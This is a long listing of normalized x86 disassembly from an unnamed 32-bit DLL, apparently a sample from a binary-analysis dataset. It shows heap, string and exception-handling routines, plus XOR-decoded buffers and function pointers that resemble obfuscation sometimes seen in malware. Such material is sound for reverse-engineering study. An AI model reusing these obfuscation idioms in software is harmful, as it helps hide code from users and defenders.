sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xfc ] eax
mov edi ecx
mov esi edx
test ebx ebx
jne r-xdata
push ebx
push eax
push esi
push 0x0
call sub_1005f240
add esp 0x10
mov [ ebp - 0x100 ] eax
cmp eax 0xffffffd6
je r-xdata
lea eax [ ebx + 0x1 ]
jmp r-xdata
mov edx [ esi ]
inc edx
push edx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0xfc ]
push ebx
push ecx
push esi
push eax
mov [ edi ] eax
call sub_1005f240
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x47
call sub_10071e30
mov eax [ ebp - 0x100 ]
push eax
lea ecx [ ebp - 0xf8 ]
push ecx
call sub_10057f20
xor edi edi
push eax
lea edx [ ebp - 0x88 ]
lea esi [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] edi
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0xcb
mov [ ebp - 0x4 ] 0x1
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0xac ] esi
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov edx [ edi ]
push edx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edx [ ebp - 0x4c ]
mov eax 0x47
mov [ edi ] 0x0
call sub_10071e30
lea eax [ ebp - 0xdc ]
push esi
push eax
call sub_10057f20
push eax
lea edx [ ebp - 0x4c ]
lea esi [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x2
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0xcb
mov [ ebp - 0x4 ] 0x3
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x90 ] esi
jb r-xdata
xor eax eax
mov [ ebp - 0xac ] 0x7
mov [ ebp - 0xb0 ] edi
mov [ ebp - 0xc0 ] ax
cmp [ ebp - 0xe4 ] esi
jb r-xdata
mov edx [ ebp - 0xc0 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0x90 ] 0x7
mov [ ebp - 0x94 ] 0x0
mov [ ebp - 0xa4 ] dx
cmp [ ebp - 0xc8 ] esi
jb r-xdata
mov ecx [ ebp - 0xa4 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xf8 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax 0x3
jmp r-xdata
mov eax [ ebp - 0xdc ]
push eax
call sub_1000a86e
add esp 0x4
sub_1002b707
push 0x60
mov eax sub_10085373
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0x24 ]
or edi 0xffffffff
test [ esi + 0x14 ] 0x4000
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x50 ] edi
mov ecx esi
je r-xdata
lea eax [ ebp - 0x5c ]
xor ebx ebx
push eax
mov [ ebp - 0x58 ] ebx
call sub_10007a10
mov esi [ esi + 0x14 ]
lea ecx [ ebp - 0x58 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x4
call sub_1006b26d
add esp 0x18
push eax
lea eax [ ebp - 0x6c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10046885
add esp 0x10
lea ecx [ ebp - 0x5c ]
mov esi eax
mov [ ebp - 0x4 ] edi
call sub_1002be90
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x6c ] eax
je r-xdata
lea eax [ ebp - 0x50 ]
push eax
call sub_10007a10
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10067ab7
pop ecx
lea ecx [ ebp - 0x50 ]
mov esi eax
mov [ ebp - 0x4 ] edi
call sub_1002be90
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x38 ] 0xf
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
call sub_10021130
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_100332a0
push edi
push ebx
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_10004e10
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10005b50
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_10042a70
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_1002f75b
push edi
push ebx
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_10004e10
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10005b50
cmp [ ebp - 0x38 ] 0x10
mov eax [ ebp - 0x4c ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
mov eax [ ebp - 0x54 ]
je r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10051f24
add esp 0x10
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] edi
call sub_10005b50
jmp r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x50 ] ebx
jge r-xdata
or [ eax ] 0x1
cmp esi 0x1
ja r-xdata
mov ecx [ ebp - 0x68 ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x60 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_1002b8b6
push 0x10
mov eax sub_10085553
call sub_10026266
mov edi ecx
mov ecx [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10007a10
and [ ebp - 0x4 ] 0x0
push eax
call sub_10022420
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
call sub_1002be90
mov esi [ ebp + 0x28 ]
mov ebx [ ebp + 0x20 ]
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x25
jne r-xdata
jmp r-xdata
cmp al 0x20
je r-xdata
push 0x0
mov eax [ edi ]
inc esi
movzx ecx [ esi ]
push ecx
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x1c ]
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x1c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10008d33
retn 0x24
or [ ebx ] 0x1
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov al [ ebp + 0x11 ]
cmp al [ esi ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
movzx eax [ ebp + 0x11 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0x10 ]
test [ ecx + eax * 2 ] 0x48
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
or [ ebx ] 0x2
lea ecx [ ebp + 0xc ]
call sub_1005f5ef
lea ecx [ ebp + 0xc ]
call sub_1005f5ef
sub_1002b9c0
push ebp
mov ebp esp
push 0xffffffff
push sub_100893f1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebx + 0xc8 ]
sub eax [ ebx + 0xc4 ]
mov edi edx
sar eax 0x2
xor esi esi
mov [ ebp - 0x88 ] edi
test eax eax
je r-xdata
push 0x44
call sub_1002e3ac
add esp 0x4
mov [ ebp - 0x88 ] eax
xor ecx ecx
mov [ ebp - 0x4 ] ecx
cmp eax ecx
je r-xdata
mov ecx [ ebx + 0xc4 ]
mov edi [ edi + 0x4 ]
mov [ ebp - 0x88 ] ecx
mov edx ecx
mov edx edi
mov edi eax
call sub_1005dc40
mov edx eax
mov [ ebp - 0x88 ] edx
jmp r-xdata
mov eax [ ebx + 0xc4 ]
mov ecx [ eax + esi * 4 ]
mov eax [ ebp - 0x88 ]
push ecx
call sub_100699f0
mov eax esi
jmp r-xdata
inc esi
add ecx 0x4
cmp esi eax
jb r-xdata
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0x4f
and esi 0xff
mov [ ebp + eax * 2 - 0x4c ] si
inc eax
cmp eax 0x1c
jb r-xdata
xor eax eax
mov [ ebp - 0x14 ] ax
mov eax [ edx + 0x4 ]
push eax
lea ecx [ ebp - 0x84 ]
push ecx
call sub_10057f20
push eax
lea edx [ ebp - 0x4c ]
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x1
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0xce
mov [ ebp - 0x4 ] 0x2
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ r--data ]
mov [ ebp - 0x8c ] edx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
cmp [ edx + 0x4 ] edi
je r-xdata
mov edi [ ebp - 0x88 ]
xor eax eax
mov edi 0x7
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x68 ] ax
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x68 ]
push edx
call sub_1000a86e
add esp 0x4
mov eax [ ebx + 0xc8 ]
xor edx edx
lea ecx [ ebp - 0x8c ]
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] 0x0
mov [ ebp - 0x84 ] dx
cmp ecx eax
jae r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_1000a86e
add esp 0x4
mov ecx [ ebx + 0xcc ]
cmp eax ecx
jne r-xdata
mov edx [ ebx + 0xc4 ]
cmp edx ecx
ja r-xdata
mov eax [ ebx + 0xc8 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc4 ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edi ecx
mov ecx [ ebx + 0xcc ]
sub edi edx
sar edi 0x2
cmp eax ecx
jne r-xdata
add [ ebx + 0xc8 ] 0x4
mov eax [ ebx + 0xc8 ]
sub eax [ ebx + 0xc4 ]
sar eax 0x2
dec eax
mov edx [ ebp - 0x88 ]
mov [ eax ] edx
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_10030594
mov eax [ ebx + 0xc8 ]
test eax eax
je r-xdata
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edx ecx
shr edx 0x1
mov esi 0x3fffffff
sub esi edx
cmp esi ecx
jae r-xdata
mov edx [ ebx + 0xc4 ]
mov ecx [ edx + edi * 4 ]
mov [ eax ] ecx
jmp r-xdata
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_10030594
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x1
mov esi 0x3fffffff
sub esi edx
cmp esi ecx
jae r-xdata
push ecx
lea esi [ ebx + 0xc4 ]
call sub_10044070
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
lea esi [ ebx + 0xc4 ]
call sub_10044070
mov ecx eax
cmp ecx eax
jae r-xdata
sub_1002bc64
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1004a962
add esp 0x14
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
call sub_1005b670
mov [ eax ] esi
call sub_1004b131
mov eax esi
jmp r-xdata
or eax 0xffffffff
cmp ebx eax
je r-xdata
call sub_1005b670
mov [ eax ] esi
call sub_1004b131
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10032529
leave
retn
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_1000f461
add esp 0x10
test eax eax
je r-xdata
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
mov eax ebx
sete cl
sub eax ecx
pop ebx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push esi
push ebx
mov ecx edi
call sub_10082dc3
add esp 0x10
mov [ edi ] 0x0
jmp r-xdata
sub_1002bd30
push ebp
mov ebp esp
push 0xffffffff
push sub_10086448
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_1000c927
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_10004aa4
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10003c9c
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_1004c5a0
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ rw-data ] esi
call sub_1000c927
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_100661c2
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_10055e2a
lea ecx [ ebp + 0x8 ]
call sub_10003c9c
push esi
call sub_10008715
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_1002be90
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ecx ]
test edi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1000c927
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4 ]
not esi
call sub_10003c9c
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
pop esi
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_1002bedb
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10047a9f
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_1002bf80
push ebp
mov ebp esp
push 0xffffffff
push sub_10088ca4
mov eax [ fs : 0x0 ]
push eax
sub esp 0x31c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x208
xor edi edi
lea eax [ ebp - 0x2a8 ]
mov ebx ecx
push edi
push eax
mov [ ebp - 0x328 ] ebx
call sub_1007f8f0
add esp 0xc
lea ecx [ ebp - 0x2a8 ]
call sub_10063850
mov esi eax
cmp esi edi
je r-xdata
mov esi [ ebx ]
lea edi [ ebp - 0x31c ]
call sub_1006df00
mov esi eax
xor edi edi
cmp esi edi
je r-xdata
lea edx [ ebp - 0x58 ]
lea eax [ edi + 0x62 ]
call sub_10069020
lea ecx [ ebp - 0x2e0 ]
push esi
push ecx
call sub_10057f20
push eax
lea edx [ ebp - 0x58 ]
lea esi [ ebp - 0x2c4 ]
mov [ ebp - 0x4 ] edi
call sub_10040e00
add esp 0xc
mov edx eax
lea ecx [ edi + 0x19 ]
mov [ ebp - 0x4 ] 0x1
call sub_10022b50
mov ebx 0x8
cmp [ ebp - 0x2b0 ] ebx
jb r-xdata
mov ebx [ ebx ]
lea eax [ ebp - 0x320 ]
push eax
lea ecx [ ebp - 0x324 ]
mov [ ebp - 0x31c ] edi
mov [ ebp - 0x320 ] edi
mov [ ebp - 0x324 ] edi
call sub_1002b180
mov esi eax
mov ebx 0x8
test esi esi
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x121
call sub_10069020
lea edx [ ebp - 0x2e0 ]
push esi
push edx
call sub_10057f20
push eax
lea edx [ ebp - 0x54 ]
lea esi [ ebp - 0x2c4 ]
mov [ ebp - 0x4 ] 0x2
call sub_10040e00
add esp 0xc
mov edx eax
lea ecx [ edi + 0x19 ]
mov [ ebp - 0x4 ] 0x3
call sub_10022b50
mov ebx 0x8
cmp [ ebp - 0x2b0 ] ebx
jb r-xdata
xor eax eax
mov [ ebp - 0x2b0 ] 0x7
mov [ ebp - 0x2b4 ] edi
mov [ ebp - 0x2c4 ] ax
cmp [ ebp - 0x2cc ] ebx
jb r-xdata
mov edx [ ebp - 0x2c4 ]
push edx
call sub_1000a86e
add esp 0x4
lea edi [ ebp - 0x324 ]
lea ecx [ ebp - 0x320 ]
call sub_10031c90
mov esi eax
test esi esi
je r-xdata
lea edx [ ebp - 0x58 ]
lea eax [ ebx + 0x6e ]
call sub_10069020
lea ecx [ ebp - 0x2e0 ]
push esi
push ecx
call sub_10057f20
push eax
lea edx [ ebp - 0x58 ]
lea esi [ ebp - 0x2c4 ]
mov [ ebp - 0x4 ] 0x4
call sub_10040e00
add esp 0xc
mov edx eax
lea ecx [ ebx + 0x11 ]
mov [ ebp - 0x4 ] 0x5
call sub_10022b50
cmp [ ebp - 0x2b0 ] ebx
jb r-xdata
xor ecx ecx
mov [ ebp - 0x2b0 ] 0x7
mov [ ebp - 0x2b4 ] edi
mov [ ebp - 0x2c4 ] cx
cmp [ ebp - 0x2cc ] ebx
jb r-xdata
mov eax [ ebp - 0x2c4 ]
push eax
call sub_1000a86e
add esp 0x4
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0x2e0 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x324 ]
mov ecx [ ebp - 0x320 ]
push eax
push ecx
lea eax [ ebp - 0x2a8 ]
call sub_1002f360
mov esi eax
add esp 0x8
test esi esi
je r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0xb0
call sub_10069020
lea edx [ ebp - 0x2c4 ]
push esi
push edx
call sub_10057f20
push eax
lea edx [ ebp - 0x58 ]
lea esi [ ebp - 0x2e0 ]
mov [ ebp - 0x4 ] 0x6
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x19
mov [ ebp - 0x4 ] 0x7
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x2c4 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100702e0
mov [ ebp - 0x31c ] 0x4
jmp r-xdata
xor eax eax
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x2b0 ] 0x7
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x2c4 ] ax
cmp [ ebp - 0x2cc ] ebx
jb r-xdata
mov edx [ ebp - 0x2c4 ]
push edx
call sub_1000a86e
add esp 0x4
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x2e0 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x328 ]
mov esi [ eax ]
call sub_100720b0
mov esi eax
test esi esi
je r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x11c
call sub_10069020
lea edx [ ebp - 0x2c4 ]
push esi
push edx
call sub_10057f20
push eax
lea edx [ ebp - 0x58 ]
lea esi [ ebp - 0x2e0 ]
mov [ ebp - 0x4 ] 0x8
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x19
mov [ ebp - 0x4 ] 0x9
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x2c4 ]
call sub_100702e0
mov eax 0x5
jmp r-xdata
mov [ ebp - 0x31c ] 0x3
mov ecx [ ebp - 0x2e0 ]
push ecx
call sub_1000a86e
add esp 0x4
mov esi [ ebp - 0x31c ]
lea edx [ ebp - 0xa0 ]
mov eax 0x11c
call sub_10069020
lea ecx [ ebp - 0x318 ]
push esi
push ecx
call sub_10057f20
push eax
lea edx [ ebp - 0xa0 ]
lea esi [ ebp - 0x2fc ]
mov [ ebp - 0x4 ] 0xa
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x19
mov [ ebp - 0x4 ] 0xb
call sub_10022b50
cmp [ ebp - 0x2e8 ] ebx
jb r-xdata
mov eax esi
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor eax eax
mov [ ebp - 0x2e8 ] 0x7
mov [ ebp - 0x2ec ] 0x0
mov [ ebp - 0x2fc ] ax
cmp [ ebp - 0x304 ] ebx
jb r-xdata
mov edx [ ebp - 0x2fc ]
push edx
call sub_1000a86e
add esp 0x4
mov esi 0x6
jmp r-xdata
mov ecx [ ebp - 0x318 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x320 ]
test eax eax
je r-xdata
sub_1002c3f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086e22
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_1006bde0
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_1006bde0
push eax
jmp r-xdata
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] edx
mov [ ecx ] dl
call sub_1003acf0
sub_1002c4d0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x40
mov ecx [ ebp + 0x8 ]
mov dl [ ebp + 0xc ]
mov [ esp + 0x14 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ esp + 0x18 ] dl
mov edx [ ebp + 0x14 ]
mov [ esp + 0x1c ] ecx
mov ecx [ ebp + 0x18 ]
mov [ esp + 0x20 ] edx
mov edx [ ebp + 0x1c ]
mov [ esp + 0x24 ] ecx
mov ecx [ ebp + 0x20 ]
push ebx
mov [ esp + 0x2c ] edx
mov edx [ ebp + 0x24 ]
mov [ esp + 0x30 ] ecx
mov ecx [ ebp + 0x28 ]
push esi
xor eax eax
mov [ esp + 0x38 ] edx
mov edx [ ebp + 0x2c ]
mov [ esp + 0x3c ] ecx
mov ecx [ ebp + 0x30 ]
mov bl 0x38
push eax
mov [ esp + 0x44 ] edx
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov [ esp + 0x48 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0xc ]
xor [ esp + 0x10 ] bl
xor [ esp + 0x11 ] bl
xor [ esp + 0x12 ] bl
xor [ esp + 0x13 ] bl
push eax
lea edx [ esp + 0x18 ]
push edx
push ecx
push eax
push eax
mov [ esp + 0x28 ] 0x9
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
call [ esp + 0x24 ]
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov esi eax
push 0xffffffff
push esi
call [ esp + 0x14 ]
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push esi
call [ esp + 0x10 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x14 ]
mov [ esp + 0xc ] ecx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push edx
call [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x2c
sub_1002c600
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx eax
push esi
push edi
test ebx ebx
jne r-xdata
call sub_10011800
test eax eax
je r-xdata
lea eax [ ebx + 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x128 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
test eax eax
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx rw-data
mov [ ebp - 0xc ] rw-data
